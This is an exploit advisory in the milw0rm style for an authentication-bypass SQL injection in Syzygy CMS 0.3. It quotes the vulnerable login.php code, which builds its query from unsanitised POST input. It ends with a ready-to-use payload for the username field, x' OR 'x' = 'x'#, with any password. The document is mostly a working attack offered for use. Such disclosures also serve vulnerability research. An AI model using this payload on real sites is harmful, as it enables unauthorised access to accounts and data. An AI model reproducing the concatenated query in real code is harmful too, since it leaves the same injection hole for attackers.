@@ -1,0 +1,32 @@
+--+++=========================================================================+++--
+--+++====== Syzygy CMS <= 0.3 (Auth Bypass) SQL Injection Vulnerability ======+++--
+--+++=========================================================================+++--
+
+[+] Syzygy CMS <= 0.3 (Auth Bypass) SQL Injection Vulnerability
+[+] Author : darkjoker
+[+] Site   : http://darkjoker.net23.net
+[+] Greetz : my girlfriend, Vivi
+[+] File   : login.php
+
+[+] Code:
+    17  $username=$_POST['username'];
+    18  $password=md5($_POST['password']);
+    19  $current_login=mysql_query("SELECT * FROM ".$mysql_prefix."users WHERE username='".$username."' AND password='".$password."'");
+    20
+    21  if (mysql_num_rows($current_login)==0)
+    22  {
+    23          header("Location: http://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/"."index.php?page=invalid.php");
+    24  } else {
+    25		$current_user=mysql_fetch_array($current_login, MYSQL_ASSOC);
+    26		$_SESSION['user']=$current_user['username'];
+    27		$_SESSION['perms']=$current_user['perms'];
+    28 		$style_query=mysql_query("SELECT filename FROM ".$mysql_prefix."layout_style WHERE id='".$current_user['style']."'");
+    29		$style_info=mysql_fetch_array($style_query,MYSQL_ASSOC);
+    30 		$_SESSION['style']=$style_info['filename'];
+    31		header("Location: http://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF'])."/"."index.php");
+    32  }
+
+[+] Username: x' OR 'x' = 'x'#
+[+] Password: anything
+
+# milw0rm.com [2009-01-14]
